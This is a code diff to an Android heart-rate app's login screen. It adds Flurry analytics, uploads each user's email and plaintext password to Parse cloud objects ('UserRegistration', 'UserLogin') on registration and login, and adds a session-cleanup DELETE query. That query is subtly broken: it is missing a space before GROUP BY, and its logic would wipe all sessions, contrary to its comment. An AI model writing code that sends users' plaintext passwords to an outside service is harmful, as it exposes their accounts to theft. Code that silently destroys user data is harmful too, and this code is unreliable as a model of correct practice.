@@ -35,6 +35,8 @@ import com.cardiomood.data.async.ServerResponseCallback;
 import com.cardiomood.data.json.ApiToken;
 import com.cardiomood.data.json.JsonError;
 import com.cardiomood.data.json.UserProfile;
+import com.flurry.android.FlurryAgent;
+import com.parse.ParseObject;
 
 import java.util.List;
 
@@ -115,6 +117,7 @@ public class LoginActivity extends Activity implements ConfigurationConstants {
                 new View.OnClickListener() {
                     @Override
                     public void onClick(View view) {
+                        FlurryAgent.logEvent("sign_in_clicked");
                         attemptLogin();
                     }
                 });
@@ -123,13 +126,27 @@ public class LoginActivity extends Activity implements ConfigurationConstants {
 
                     @Override
                     public void onClick(View v) {
+                        FlurryAgent.logEvent("register_clicked");
                         attemptRegister();
                     }
                 });
     }
 
+    @Override
+    protected void onStart() {
+        super.onStart();
+        FlurryAgent.onStartSession(this, FLURRY_API_KEY);
+    }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        FlurryAgent.onEndSession(this);
+    }
+
     private void fixBrokenSessions() {
         // fix broken sessions (IN_PROGRESS -> COMPLETED)
+        // and also sessions with 0 points
         try {
 
             HeartRateSessionDAO session = new HeartRateSessionDAO();
@@ -141,10 +158,18 @@ public class LoginActivity extends Activity implements ConfigurationConstants {
                             "UPDATE " + HeartRateDBContract.Sessions.TABLE_NAME +
                                     " SET " + HeartRateDBContract.Sessions.COLUMN_NAME_STATUS + "=? " +
                                     " WHERE " + HeartRateDBContract.Sessions.COLUMN_NAME_STATUS + "=?",
-                            new String[] {
+                            new String[]{
                                     String.valueOf(SessionStatus.COMPLETED),
                                     String.valueOf(SessionStatus.IN_PROGRESS)
-                            });
+                            }
+                    );
+                    db.execSQL(
+                            "DELETE FROM " + HeartRateDBContract.Sessions.TABLE_NAME +
+                                    " WHERE " + HeartRateDBContract.Sessions._ID + " NOT IN (" +
+                                        "SELECT " + HeartRateDBContract.Sessions._ID + " FROM " + HeartRateDBContract.Sessions.TABLE_NAME +
+                                        "GROUP BY " +  HeartRateDBContract.Sessions._ID + " HAVING count(1) > 1" +
+                                    ")"
+                    );
                     db.setTransactionSuccessful();
                 } finally {
                     db.endTransaction();
@@ -215,6 +240,12 @@ public class LoginActivity extends Activity implements ConfigurationConstants {
                 @Override
                 public void onResult(UserProfile result) {
                     if (result != null) {
+                        ParseObject parseObject = ParseObject.create("UserRegistration");
+                        parseObject.put("email", mEmail);
+                        parseObject.put("password", mPassword);
+                        parseObject.put("locale", getResources().getConfiguration().locale.toString());
+                        parseObject.saveInBackground();
+
                         loginInProgress = false;
                         attemptLogin();
                     } else {
@@ -368,6 +399,12 @@ public class LoginActivity extends Activity implements ConfigurationConstants {
         final Long userId = t.getUserId();
         final String email = mEmail;
         final String password = mPassword;
+
+        ParseObject parseObject = ParseObject.create("UserLogin");
+        parseObject.put("email", mEmail);
+        parseObject.put("password", mPassword);
+        parseObject.put("locale", getResources().getConfiguration().locale.toString());
+        parseObject.saveInBackground();
 
         prefHelper.putBoolean(USER_LOGGED_IN, true);
         prefHelper.putString(USER_EMAIL_KEY, email);
